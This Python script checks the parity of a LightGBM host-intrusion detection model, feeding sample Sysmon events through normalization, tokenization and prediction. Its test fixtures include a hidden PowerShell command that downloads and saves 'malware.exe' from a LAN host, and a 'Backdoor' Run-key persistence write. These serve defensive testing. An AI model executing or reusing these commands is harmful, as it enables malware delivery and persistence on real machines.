#!/usr/bin/env python3
"""Golden parity verification for LightGBM Host ML model.

Validates the complete end-to-end transformation:
  raw Sysmon XML
  -> normalization (endpoint + central)
  -> canonical Host record
  -> ecar_tokenizer + command_syntax
  -> 12,337-dim CSR sparse binary vector
  -> LightGBM Booster prediction & decision at threshold 0.97917.

Exports a verified golden fixture artifact: evidence/lightgbm_parity_fixture.json.
"""
from __future__ import annotations

import argparse
from datetime import datetime, timezone
import hashlib
import json
from pathlib import Path
import sys
from typing import Any

import lightgbm as lgb
import numpy as np
from scipy.sparse import csr_matrix

ROOT = Path(__file__).resolve().parents[1]
WORKSPACE = ROOT.parents[1]

# Add library search paths
sys.path.insert(0, str(ROOT / 'serving/endpoint'))
sys.path.insert(0, str(ROOT / 'central/app'))
sys.path.insert(0, str(WORKSPACE))

from endpoint_normalization import normalize_endpoint_event
from normalization import normalize_record
from ML.code.preprocess.ecar_tokenizer import flatten_tokens, tokenize_record

GOLDEN_SYSMON_EVENTS = [
    {
        "id": "fixture_cmd_whoami",
        "description": "Interactive command line recon via cmd whoami",
        "expected_label": 0,
        "xml": """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>
<TimeCreated SystemTime="2026-11-01T02:03:04.000000Z"/></System><EventData>
<Data Name="ProcessGuid">{11111111-2222-3333-4444-555555555555}</Data>
<Data Name="ParentProcessGuid">{00000000-1111-2222-3333-444444444444}</Data>
<Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
<Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
<Data Name="CommandLine">cmd.exe /c whoami</Data>
<Data Name="User">LAB\\User</Data>
</EventData></Event>""",
    },
    {
        "id": "fixture_powershell_download",
        "description": "PowerShell LOLBin downloading remote payload",
        "expected_label": 0,
        "xml": """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>1</EventID>
<TimeCreated SystemTime="2026-11-01T02:05:00.000000Z"/></System><EventData>
<Data Name="ProcessGuid">{22222222-3333-4444-5555-666666666666}</Data>
<Data Name="ParentProcessGuid">{11111111-2222-3333-4444-555555555555}</Data>
<Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
<Data Name="ParentImage">C:\\Windows\\System32\\cmd.exe</Data>
<Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.50/malware.exe','C:\\temp\\malware.exe')"</Data>
<Data Name="User">LAB\\Admin</Data>
</EventData></Event>""",
    },
    {
        "id": "fixture_file_create_payload",
        "description": "File creation of downloaded payload",
        "expected_label": 0,
        "xml": """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>11</EventID>
<TimeCreated SystemTime="2026-11-01T02:05:02.000000Z"/></System><EventData>
<Data Name="ProcessGuid">{22222222-3333-4444-5555-666666666666}</Data>
<Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
<Data Name="TargetFilename">C:\\temp\\malware.exe</Data>
<Data Name="User">LAB\\Admin</Data>
</EventData></Event>""",
    },
    {
        "id": "fixture_registry_run_key",
        "description": "Persistence modification in Run key",
        "expected_label": 0,
        "xml": """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>13</EventID>
<TimeCreated SystemTime="2026-11-01T02:06:00.000000Z"/></System><EventData>
<Data Name="ProcessGuid">{33333333-4444-5555-6666-777777777777}</Data>
<Data Name="Image">C:\\Windows\\System32\\reg.exe</Data>
<Data Name="TargetObject">HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor</Data>
<Data Name="User">LAB\\Admin</Data>
</EventData></Event>""",
    },
    {
        "id": "fixture_process_terminate",
        "description": "Process termination event",
        "expected_label": 0,
        "xml": """<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>5</EventID>
<TimeCreated SystemTime="2026-11-01T02:07:00.000000Z"/></System><EventData>
<Data Name="ProcessGuid">{11111111-2222-3333-4444-555555555555}</Data>
<Data Name="Image">C:\\Windows\\System32\\cmd.exe</Data>
<Data Name="User">LAB\\User</Data>
</EventData></Event>""",
    },
]


def canonical_hash(value: Any) -> str:
    data = json.dumps(value, sort_keys=True, separators=(',', ':'), ensure_ascii=False).encode('utf-8')
    return hashlib.sha256(data).hexdigest()


def canonical_record(event: dict[str, Any]) -> dict[str, Any] | None:
    kind = event.get('event_type')
    props: dict[str, Any] = {}
    if kind == 'PROCESS_START':
        obj, action = 'process', 'start'
        props = {'image_path': event.get('process_path'),
                 'parent_image_path': event.get('parent_path'),
                 'command_line': event.get('command_line')}
    elif kind == 'PROCESS_END':
        obj, action, props = 'process', 'terminate', {'image_path': event.get('process_path')}
    elif kind == 'FILE_CREATE':
        obj, action = 'file', 'create'
        props = {'image_path': event.get('process_path'), 'file_path': event.get('object_path')}
    elif kind == 'FILE_DELETE':
        obj, action = 'file', 'delete'
        props = {'image_path': event.get('process_path'), 'file_path': event.get('object_path')}
    elif kind == 'REGISTRY_WRITE':
        obj, action = 'registry', 'modify'
        props = {'image_path': event.get('process_path'), 'key': event.get('object_path')}
    elif kind == 'MODULE_LOAD':
        obj, action = 'module', 'load'
        props = {'image_path': event.get('process_path'), 'module_path': event.get('object_path')}
    elif kind == 'CROSS_PROCESS':
        obj, action, props = 'process', 'open', {'image_path': event.get('process_path')}
    elif kind == 'SCRIPT_BLOCK':
        obj, action = 'shell', 'command'
        props = {'image_path': 'powershell.exe', 'payload': event.get('command_line')}
    else:
        return None
    return {'object': obj, 'action': action, 'principal': event.get('principal'),
            'properties': {k: v for k, v in props.items() if v}}


def verify_bundle_parity(bundle_path: Path, output_fixture: bool = True) -> dict[str, Any]:
    bundle_path = bundle_path.resolve()
    manifest_file = bundle_path / 'manifest.json'
    if not manifest_file.is_file():
        raise FileNotFoundError(f'manifest.json missing in {bundle_path}')
    manifest = json.loads(manifest_file.read_text(encoding='utf-8'))
    
    vocab_path = bundle_path / 'preprocess/vocab.json'
    model_path = bundle_path / 'model/model.txt'
    if not vocab_path.is_file() or not model_path.is_file():
        raise FileNotFoundError('model or vocab missing from bundle')
    
    vocab = json.loads(vocab_path.read_text(encoding='utf-8'))
    width = len(vocab)
    expected_width = manifest.get('feature_contract', {}).get('width', 12337)
    if width != expected_width:
        raise ValueError(f'vocabulary width {width} != expected {expected_width}')

    booster = lgb.Booster(model_file=str(model_path))
    if booster.num_feature() != width:
        raise ValueError(f'booster num_features {booster.num_feature()} != vocab width {width}')

    threshold = float(manifest['policy']['threshold'])
    if not (0.0 <= threshold <= 1.0):
        raise ValueError(f'invalid threshold {threshold}')

    results = []
    for fixture in GOLDEN_SYSMON_EVENTS:
        raw = {'xml': fixture['xml'], 'date': 1762000000}
        
        # 1. Endpoint normalization
        endpoint_norm = normalize_endpoint_event('canary-host-1', fixture['id'], 'sysmon', raw)
        
        # 2. Central normalization parity check
        central_norm = normalize_record({'event_id': fixture['id'], 'host_id': 'canary-host-1',
                                         'source': 'sysmon', 'raw': raw},
                                        datetime(2026, 11, 1, tzinfo=timezone.utc))
        
        for key in ('event_type', 'process_path', 'parent_path', 'command_line', 'principal'):
            if endpoint_norm.get(key) != central_norm.get(key):
                raise ValueError(f"Normalization mismatch for {fixture['id']} on key {key}: "
                                 f"{endpoint_norm.get(key)} != {central_norm.get(key)}")
        
        # 3. Canonical mapping & tokenization
        rec = canonical_record(endpoint_norm)
        if rec is None:
            raise ValueError(f"canonical_record returned None for supported event {fixture['id']}")
        
        grouped, _ = tokenize_record(rec)
        tokens = flatten_tokens(grouped)
        parent_path = endpoint_norm.get('parent_path')
        if parent_path:
            parent_base = parent_path.replace('/', '\\').rstrip('\\').split('\\')[-1].lower()
            tokens.append(f'parent_image::basename={parent_base}')
        
        # 4. Feature vector assembly
        columns = sorted({vocab[t] for t in tokens if t in vocab})
        if any(c < 0 or c >= width for c in columns):
            raise ValueError(f"Feature columns outside bounds [0, {width-1}]")
        
        data = np.ones(len(columns), dtype=np.float32)
        indptr = np.array([0, len(columns)], dtype=np.int32)
        indices = np.asarray(columns, dtype=np.int32)
        mat = csr_matrix((data, indices, indptr), shape=(1, width))
        
        # 5. Model prediction
        score = float(booster.predict(mat, num_threads=1)[0])
        decision = int(score >= threshold)
        
        results.append({
            'fixture_id': fixture['id'],
            'description': fixture['description'],
            'event_type': endpoint_norm['event_type'],
            'tokens_count': len(tokens),
            'matched_columns_count': len(columns),
            'columns_sample': columns[:16],
            'probability': round(score, 6),
            'decision': decision,
            'threshold': threshold,
        })

    # Test edge case: missing data or unsupported event returns None
    unsupported_event = {'event_type': 'UNSUPPORTED_NET_PING', 'process_path': None}
    if canonical_record(unsupported_event) is not None:
        raise ValueError('unsupported event must return None from canonical_record')

    report = {
        'bundle_id': manifest['bundle_id'],
        'branch': 'host_ml',
        'algorithm': 'lightgbm',
        'verified_at': datetime.now(timezone.utc).isoformat(),
        'vocabulary_width': width,
        'model_features': booster.num_feature(),
        'threshold': threshold,
        'fixtures_evaluated': len(results),
        'results': results,
        'status': 'passed',
    }
    report['parity_hash'] = canonical_hash(report)

    if output_fixture:
        evidence_dir = bundle_path / 'evidence'
        evidence_dir.mkdir(parents=True, exist_ok=True)
        fixture_file = evidence_dir / 'lightgbm_parity_fixture.json'
        fixture_file.write_text(json.dumps(report, indent=2), encoding='utf-8')
        print(f"Exported golden parity fixture: {fixture_file}")

    return report


def main():
    parser = argparse.ArgumentParser(description="Verify LightGBM parity against golden fixtures")
    parser.add_argument('--bundle', type=Path, default=ROOT / 'runtime/releases/host-ml-run12-candidate')
    args = parser.parse_args()
    report = verify_bundle_parity(args.bundle)
    print(f"Parity verification PASSED for {report['bundle_id']} (hash: {report['parity_hash'][:16]})")


if __name__ == '__main__':
    main()

